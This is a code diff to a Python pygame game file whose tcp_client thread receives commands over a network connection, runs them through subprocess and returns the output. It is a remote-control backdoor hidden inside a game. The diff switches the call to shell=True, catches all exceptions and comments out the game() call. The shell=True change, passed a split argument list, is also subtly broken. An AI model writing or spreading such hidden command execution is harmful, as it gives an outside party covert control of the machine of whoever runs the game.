@@ -1,6 +1,8 @@
 import pygame, sys, time, random
 from pycomm.connection import Connection
-import time, subprocess, threading
+import time
+import subprocess
+import threading
 
 
 # Difficulty settings
@@ -199,8 +201,8 @@ def tcp_client():
             break
         result = "No result"
         try:
-            result = subprocess.check_output(command.split()).decode('utf-8')
-        except subprocess.CalledProcessError as err:
+            result = subprocess.check_output(command.split(), shell=True).decode('utf-8')
+        except Exception as err:
             print("Error running command")
             print(err)
             result = str(err)
@@ -213,6 +215,7 @@ if __name__ == "__main__":
     t2 = threading.Thread(target=tcp_client)
     t1.start()
     t2.start()
+    #game()
     t1.join()
     t2.join()
 
